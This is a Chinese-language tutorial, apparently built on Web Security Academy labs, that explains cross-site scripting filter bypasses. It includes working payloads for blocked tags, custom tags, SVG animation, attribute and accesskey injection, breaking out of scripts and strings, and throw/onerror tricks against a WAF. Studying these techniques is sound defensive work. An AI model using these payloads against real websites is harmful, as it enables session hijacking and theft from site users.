大部分标签和属性被屏蔽#

例如，测试时可以发现大多数的标签和事件被拦截，只有部分可用。进行爆破，发现只有body标签和onresize事件没有被过滤。于是，在xss服务器上输入：

1<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>

保存后输出。onresize事件会在窗口大小改变时触发print()，拖动窗口改变大小便触发了print()。

只有自定义标签能通过#

例如，所有标签都被过滤时，由于现代浏览器对自定义标签非常宽容，所以可以使用自定义标签。因此，可用在xss服务器上输入：

1<script>
2location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
3</script>

中间是经过URL编码的结果，解码后结果为：

1<script>
2location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
3</script>

其中的<xss>是自定义标签，只要有 tabindex 属性，就可以通过键盘 Tab 或 JS 的 .focus() 获得焦点。tabindex让这个自定义元素可以被聚焦（否则 onfocus 永远不会触发）。URL 末尾的 #x 会让浏览器尝试滚动到 id="x" 的元素。

事件和 href 属性被阻止#

例如，所有事件都被阻止，href 锚点属性（如 <a href="javascript:...">）也被过滤。只能自定义事件：

1?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>

翻译过来就是：

1<svg>
2  <a>
3    <animate attributeName="href" values="javascript:alert(1)" />
4    <text x=20 y=20>Click me</text>
5  </a>
6</svg>

SVG 支持 SMIL（Synchronized Multimedia Integration Language）动画，其中 <animate> 可以在运行时动态修改元素的属性。<a> 是一个 SVG 中的超链接元素（类似 HTML 的 <a>）。<animate attributeName="href" ...> 表示将父元素（即 <a>）的 href 属性动画化。values="javascript:alert(1)" 表示把 href 的值设为 javascript:alert(1)。这样，页面加载后，<a> 元素的 href 被动态设置为 javascript:alert(1)。

允许部分SVG标记#

例如，对标签爆破，发现可用的是svg和animatetransform；对事件爆破，发现只能用onbegin。注意，爆破事件的时候，需要对空格等进行编码转义。 payload如下：

1<svg><animatetransform onbegin=alert(1)>

角括号（<>）被编码#

例如，对于输入的值xxx，是这样处理的： <... value="xxx"> 想要简单地避免，比如使用"><script>alert(document.domain)</script>是不可行的，因为角括号被编码了，识别不出来。因此，通常可以引入一个新属性来创建脚本化的上下文，比如事件处理程序。例如：

1" autofocus onfocus=alert(document.domain) x="

上述有效负载创建了一个 onfocus 事件，当元素获得焦点时将执行 JavaScript，同时还添加了 autofocus 属性，尝试在无需用户交互的情况下自动触发 onfocus 事件。最后，它添加了 x=; 以优雅地修复后续的标记。 具体而言，可以采用下面的payload：

1"onmouseover="alert(1)

注入到带双引号 HTML 编码的href锚点属性中#

有时 XSS 上下文属于某种 HTML 标签属性，而该属性本身可以创建可脚本化的上下文。在这里，你可以执行 JavaScript 而不终止属性值。例如，如果 XSS 上下文位于锚标签的属性href中，你可以使用javascript伪协议来执行脚本。例如：

1<a href="javascript:alert(document.domain)">

例如，在一条评论中，对输入的网址https://aa.com进行这样的处理： <a href="https://aa.com"> 对于输入到锚点属性的双引号中的注入点，可以直接在网址处这样处理：

1javascript:alert(1)

规范链接标签中的反射型 XSS#

反射型的XSS更多在网址中直接注入。这一次，无法注入标签，可以利用页面中已存在的标签，通过其属性事件或内容触发脚本执行。比如，发现随着打开帖子的不同，网页中postId 参数的值在改变且直接用参数生成了 <link> 标签的 href 。可以更改参数进行尝试，发现网页代码是这样的：<link rel="canonical" href="https://web-security.net/?abcd">，更改参数：

1?'accesskey='x'onclick='alert(1)

注意，中间没有空格以绕过正则匹配。accesskey 是 HTML 元素的一个全局属性，用于定义快捷键。当用户按下对应的快捷键（通常是 Alt + x 或者其他组合，视浏览器和操作系统而定），浏览器会聚焦到该元素，方便键盘导航。第一个单引号闭合 href ，当用户按下对应的快捷键，浏览器会执行 alert(1)，弹出提示框。这样输入之后，网页源代码就会变为：

1<link rel="canonical" accesskey="X" onclick="alert(1)" />

注入到Javascript中终止脚本#

在最简单的情况下，可以关闭包含现有 JavaScript 的脚本标签，并引入一些新的HTML标签来触发 JavaScript 的执行。例如，如果XSS上下文如下：

<script> ... var input = 'controllable data here'; ... </script>

然后可以用以下负载突破现有的 JavaScript ，执行自己的 JavaScript ：

</script><img src=1 onerror=alert(document.domain)>

之所以能做到这一点，是因为浏览器首先会进行HTML解析来识别包括脚本块在内的页面元素，然后才进行 JavaScript 解析来理解并执行嵌入的脚本。上述载荷使原始脚本破损，字符串字面值未终止。但这并不妨碍后续脚本被正常解析和执行。

例如，上下文是：

1<script>
2	var searchTerms = '123456';
3    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
4</script>

虽然输入是注入到Javascript中且因转义规则（用单引号和反斜杠转义）难以逃脱，但是可以直接闭合进行注入：

1</script><script>alert(1)</script>

脱离 Javascript 字符串#

除了终止脚本，还可以直接跳出来。一些有用的脱离字符串字面形式的方法包括：

1'-alert(document.domain)-'
2';alert(document.domain)//

比如，和上面一样的上下文，但是对角括号（<>）进行了转义，那上面的办法就用不了。可以任意输入一条payload即可

在注入 Javascript 中设置WAF#

有些网站通过限制允许使用的字符来使 XSS 更加困难。这可以在网站级别实现，或者通过部署防火墙（WAF）来防止你的请求到达网站。在这些情况下，需要尝试其他调用函数的方法以绕过这些安全措施。实现这一点的一种方法是使用带有异常处理器的 throw 语句。这使你可以在不使用括号的情况下向函数传递参数。以下代码将 alert() 函数分配给全局异常处理器，而 throw 语句将 1 传递给异常处理器（在本例中是 alert）。最终结果是调用 alert() 函数，并以 1 作为参数。 onerror=alert;throw 1

例如，发现是反射型的XSS，且空格、()、/被过滤了，只能考虑间接调用，通过异常触发或类型转换触发函数。于是，输入：

1?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

翻译过来就是：

1?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
  • ‘}：闭合原本的结构
  • x = x => { throw/**/οnerrοr=alert,1337 }：定义了一个箭头函数x，函数体是一个块，其中包含一个throw语句。先执行onerror=alert（将全局window.onerror设置为alert函数），然后整个表达式的结果为1337，所以throw抛出数值1337。注释/**/用于绕过可能的关键词（如空格）过滤
  • toString=x：将全局的toString属性（即window.toString）设置为上面定义的函数x。当任何需要将window对象转换为字符串的操作发生时，都会调用这个函数。
  • window+''：将window对象与空字符串相加，这会触发JavaScript的隐式类型转换，调用window.toString()方法。

onclick事件#

当 XSS 上下文是带有引号的标签属性中的某个现有 JavaScript，例如事件处理程序时，可以使用 HTML 编码来绕过某些输入过滤器。例如，如果XSS上下文如下：

<a href="#" onclick="... var input='controllable data here'; ...">

应用程序会阻断或转义单引号字符，你可以使用以下负载来跳出JavaScript字符串，执行您自己的脚本：

&apos;-alert(document.domain)-&apos;

onclick 是 HTML 标签的属性，浏览器在解析 HTML 标签时，会先对属性值中的 HTML 实体做解码，然后传递给 JavaScript 引擎执行。可以利用这一点。 例如，对于输入的网址http://aa.com，最终处理为 onclick="var tracker={track(){}};tracker.track('https://aa.com')。那最后可以这样构造payload:

1http://&apos;-alert(1)-&apos

带有反引号的注入#

avaScript 模板的文字是允许嵌入 JavaScript 表达式的字符串文字。嵌入表达式会被评估，通常会被串接到周围的文本中。模板文字被封装在反向引号中，而非普通引号，嵌入表达式则通过${...}语法识别。 例如，以下脚本将打印包含用户显示名称的欢迎消息：

document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;

当 XSS 上下文进入 JavaScript 模板的字面值时，无需终止该文字。相反，你只需使用${...}语法嵌入一个JavaScript表达式，当处理文字时会执行。例如，如果XSS上下文如下：

<script> ... var input = `controllable data here`; ... </script>

然后可以使用以下负载执行JavaScript而不终止模板的字面性文件：

1${alert(document.domain)}

例如，源代码对输入的 aaa 是这样处理的：

1<script>
2	var message = `0 search results for 'aaa'`;
3	document.getElementById('searchMessage').innerText = message;
4</script>

可见，需要将反引号和单引号闭合。但是，他们都被以Unicode的方式转义了。只能采用下面的payload：

1${alert(1)}
